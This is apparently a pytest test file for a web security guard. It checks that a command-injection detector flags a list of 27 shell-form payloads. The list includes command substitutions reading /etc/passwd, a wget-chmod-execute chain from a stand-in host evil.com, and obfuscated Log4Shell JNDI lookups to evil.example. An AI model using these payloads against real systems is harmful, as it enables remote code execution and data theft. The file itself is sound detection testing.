import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

# LEDGER 6.713: the malicious ${...}, $(...) and backtick payloads of the
# perf/verdicts.py corpus that v4.4.0 flags with enabled_detection_categories set to
# {"cmd_injection"} (27 of 27 there). The head must flag each one under that config.
SHELL_FORM_ATTACKS = [
    "`whoami`",
    "`id`",
    "; $(whoami)",
    "| ${IFS}cat${IFS}/etc/passwd",
    "`id`; `whoami`",
    "& `reboot`",
    "${@java.lang.Runtime@getRuntime().exec('id')}",
    "${7*7}",
    "`id` search`whoami`",
    "search`whoami` LIMIT 10",
    "SELECT note; search`whoami`",
    "curl`whoami` data on file",
    "SELECT zzzzzzzzzzzzzzzzzzzzzzzzzz search`whoami`",
    "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
    "$(whoami)",
    "$(cat /etc/passwd)",
    "x$(curl evil.com)",
    "foo$(whoami)bar",
    "${IFS}",
    "${jndi:ldap://evil.example/a}",
    "${jndi:rmi://evil.example/a}",
    "${jndi:dns://evil.example/a}",
    "${lower:j}ndi",
    "${::-j}ndi",
    "${${lower:j}ndi:ldap://evil.example/a}",
    "x`nmap`",
    "x`powershell`",
]


@pytest.mark.parametrize("payload", SHELL_FORM_ATTACKS)
def test_cmd_injection_only_config_still_flags_the_v440_shell_form_attacks(
    payload: str,
) -> None:
    result = detect_penetration_attempt(
        SyncMockGuardRequest(path="/s", query_params={"q": payload}),
        SyncSecurityConfig(
            enable_redis=False, enabled_detection_categories={"cmd_injection"}
        ),
    )

    assert result.is_threat is True
